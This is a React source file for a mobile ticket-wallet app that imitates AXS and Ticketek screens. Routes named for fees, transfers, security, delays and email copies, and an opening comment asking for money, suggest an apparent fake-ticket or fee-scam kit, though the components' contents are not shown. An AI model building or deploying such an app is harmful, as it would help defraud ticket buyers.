// Read instructions instructions folder and send me money 😒
import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom'; // Importing BrowserRouter, Routes, and Route
import 'react-responsive-carousel/lib/styles/carousel.min.css';
import './App.css';
import Ticket from './mainjsx/ticket';
import Head from './mainjsx/header';
import Headertwo from './mainjsx/headertwo';
import Display from './component/display';
import Loading from './mainjsx/loading';
import Standard from './component/standard';
import Ticketek from './component/ticketex';
import Leak from './mainjsx/leak';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faArrowRight, faRightLong, faRotate, faTicketAlt } from '@fortawesome/free-solid-svg-icons';
import Fee from './mainjsx/fee';
import Sent from './component/sent';
import Nfee from './component/newfee';
import Bottompic from './mainjsx/bottompic';
import SentCopy from './new fees/sentcopy';
import Email from './new fees/emailpics/emails';
import Event from './mainjsx/event';
import History from './component/history';
import Delay from './component/delay';
import Security from './mainjsx/security';
import Test from './mainjsx/test';
import { useSwipeable } from "react-swipeable";
import Axs from './mainjsx/axs';
import ChatPage from './email files/ChatPage';
import OpenChat from './email files/OpenChat';
import 'react-error-overlay';







const Main = ({ info, events }) => {

  const [showTicket, setShowTicket] = useState(false);
  const [selectedEventIndex, setSelectedEventIndex] = useState(0);
  const [loading, setloading] = useState(true);

  useEffect(() => {
    const state=localStorage.getItem('displayhome')
    const timeoutId = setTimeout(() => {
      if (state) {
        setloading(false);
      }
    }, 7700);

    return () => clearTimeout(timeoutId);
  }, [showTicket]);

  const [werey, setwerey] = useState("")
  const handleCloseTicket = (event) => {
    setwerey("slide-down");
    const timeoutId = setTimeout(() => {
      setShowTicket(false);
    }, 1000);
  
    return () => clearTimeout(timeoutId);
  };
  
  const handleButtonClick = (eventIndex) => {
    setwerey("slide-up")
    setSelectedEventIndex(eventIndex);
      setShowTicket(true);
  };

  const firstEvent = events[0];

  const [isUpcomingActive, setIsUpcomingActive] = useState(true);

  const handleToggle = () => {
    setIsUpcomingActive((prev) => !prev);
  };
  const [isContentVisible, setIsContentVisible] = useState(false);

  useEffect(() => {
    const timeoutId = setTimeout(() => {
      setIsContentVisible(true);
    }, 6000);

    return () => clearTimeout(timeoutId);
  }, []);


  


  const handlers = useSwipeable({
    onSwipedDown: handleCloseTicket,
    preventDefaultTouchmoveEvent: true, // Prevent the default touch move behavior
    trackMouse: true // Optionally track mouse swipes too
  });


  return (
    <Router>
      <div>
        {/* Wrap the Route components with Routes */}
        <Routes>
          <Route path="/sent" element={<Fee info={info} events={firstEvent} />} />
          <Route path="/service" element={<Display events={firstEvent} info={info} />} />
          <Route path="/fee" element={<Sent events={firstEvent} info={info} />} />
          <Route path="/nfee" element={<Nfee events={firstEvent} info={info} />} />
          <Route path="/tek" element={<Ticketek event={firstEvent} info={info} />} />
          <Route path="/standard" element={<Standard event={firstEvent} info={info} />} />
          <Route path="/copy" element={<SentCopy event={firstEvent} info={info} />} />
          <Route path='/email' element={<Email event={firstEvent} info={info}/>} />
          <Route path='/event' element={<Event/>}/>
          <Route path='/history' element={<History />} />
          <Route path='/security' element={<Security event={firstEvent} info={info}/>} />
          <Route path='/delay' element={<Delay event={firstEvent} info={info}/>}/>
          <Route path='axs' element={<Axs event={firstEvent} info={info} events={events}/>} />
          <Route path='/test'element={<Test event={firstEvent} info={info}/>}/>
          <Route path="/chat" element={<ChatPage event={firstEvent} info={info}/>}/>
          <Route path="/openchat/:email" element={<OpenChat info={info}/>}/>
          <Route path="/" element={
            <>
             <div>
                  <Headertwo onCloseTicket={handleCloseTicket} info={info}/>
                  <div className='past-grid'>
                    {isContentVisible &&
                      <>
                        <div onClick={handleToggle}>
                          <p className={!isUpcomingActive ? 'inactiv' : ''}>UPCOMING ({events.length})</p>
                        </div>
                        <div onClick={handleToggle}>
                          <p className={!isUpcomingActive ? '' : 'inactiv'}>PAST (1)</p>
                        </div>
                        <div className='activegrid' id='activegrid'>
                          <div className={!isUpcomingActive ? 'activeright' : 'inactive'}></div>
                        </div>
                      </>
                    }
                  </div>
                  {loading && <Loading />}
                  {isUpcomingActive ? (
                    events.map((event, index) => (
                      loading === false && (
                        <div
                          key={index}
                          onClick={() => handleButtonClick(index)}
                          className='show-btn'
                        >
                          <img src={event.image} alt='' />
                          <div className='cover'>
                            <p>{event.title}</p>
                            <p>{event.day}, {event.date}, {event.time} <span style={{fontWeight:"bold" }} className='spant'>•</span> {event.location}</p>
                            <span>
                              <p>{event.numberOfSeats - event.tixsent} {event.numberOfSeats - event.tixsent < 2 ? "ticket" : "tickets"}</p>
                              <FontAwesomeIcon icon={faTicketAlt} className='ticket-icon' />
                              {event.tixsent > 0 ? (
                                <span style={{ position: "absolute", bottom: 15, left: 135, fontSize: "13.5px" }} className='sold-session'>
                                  <FontAwesomeIcon icon={faRightLong} style={{ fontSize: "15px" }} className='sold-session-icon' />
                                  <span style={{ marginLeft: "5px" }}><strong>{event.tixsent}</strong> unclaimed</span>
                                  <div></div>
                                </span>
                              ) : (
                                  ""
                                )}
                            </span>
                          </div>
                        </div>
                      )
                    ))
                  ) : (
                      <Leak />
                    )}
                  <Bottompic />
                </div>
            {showTicket && (
                
                <div style={{
                  position: "absolute",
                  top: 0,
                  left: 0,
                  zIndex: 9999,
                  height: "100vh",
                  width: "100%"
                }}
                className={showTicket && werey}
                {...handlers}
                >
                <Head onCloseTicket={handleCloseTicket}
                  numberOfSeats={events[selectedEventIndex].numberOfSeats} />
                <Ticket
                  info={events[selectedEventIndex]}
                  numberOfSeats={events[selectedEventIndex].numberOfSeats}
                  startingSeatNumber={events[selectedEventIndex].startingSeatNumber}
                  taylor={events[selectedEventIndex].image}
                  code={events[selectedEventIndex].code}
                  price={events[selectedEventIndex].price}
                  initialRow={events[selectedEventIndex].initialRow}
                  initialSection={events[selectedEventIndex].initialSection}
                  entry={events[selectedEventIndex].entry}
                  location={events[selectedEventIndex].location}
                  startcountdown={events[selectedEventIndex].startcountdown}
                  Generaladmission={events[selectedEventIndex].Generaladmission}
                  sent={events[selectedEventIndex].sent}
                  tixsent={events[selectedEventIndex].tixsent}
                  clinfo={info}
                />
              </div>
              )}
              </>
          } />
        </Routes>
      </div>
    </Router>
  );
};
export default Main;
